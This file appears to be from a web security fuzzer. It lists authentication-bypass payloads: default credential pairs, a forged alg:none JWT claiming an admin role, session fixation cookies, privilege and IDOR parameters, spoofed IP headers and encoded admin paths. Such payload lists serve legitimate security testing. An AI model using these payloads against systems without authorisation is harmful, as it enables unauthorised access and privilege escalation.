"""
app/services/fuzzer/payloads/auth_bypass.py
─────────────────────────────────────────────
Authentication bypass and privilege escalation payloads.
"""

AUTH_BYPASS_PAYLOADS = [
    # Default credentials
    "admin",
    "admin:admin",
    "admin:password",
    "admin:123456",
    "root:root",
    "root:toor",
    "test:test",
    "guest:guest",

    # JWT manipulation - alg:none attack
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",

    # Session fixation
    "PHPSESSID=injected_session_id",
    "sessionid=0000000000000000000000000000000",

    # IDOR parameter manipulation
    "id=1",
    "id=0",
    "id=-1",
    "user_id=1",
    "user_id=admin",
    "role=admin",
    "isAdmin=true",
    "isAdmin=1",
    "admin=true",
    "debug=true",
    "superuser=1",

    # Header-based auth bypass
    "X-Original-URL: /admin",
    "X-Forwarded-For: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1",
    "X-Real-IP: 127.0.0.1",
    "Client-IP: 127.0.0.1",

    # Path-based bypass
    "/admin/",
    "/admin/..",
    "/ADMIN",
    "/%61dmin",
    "/admin%20",
]